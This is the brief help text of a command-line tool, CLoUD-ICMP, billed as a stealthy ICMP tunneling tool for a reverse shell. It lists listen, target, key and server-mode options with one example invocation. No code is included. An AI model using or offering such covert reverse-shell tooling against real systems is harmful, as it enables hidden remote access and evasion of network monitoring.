...
CLoUD-ICMP is a stealthy ICMP tunneling tool for secure reverse shell.

Required Options:
 1 -->  -i   //   Interface IP to listen on (example = -i 0.0.0.0)
 2 -->  -t   //   Target address  (example = -t 192.168.1.100)

Optional Options:
 1 --> -p   //  Secret key for authentication (default: auto-generated)
 2 --> -s   //  Enable server mode (default: agent mode)

Example:
  CLoUD-ICMP -i 0.0.0.0 -t 192.168.1.100 -s -p 5678
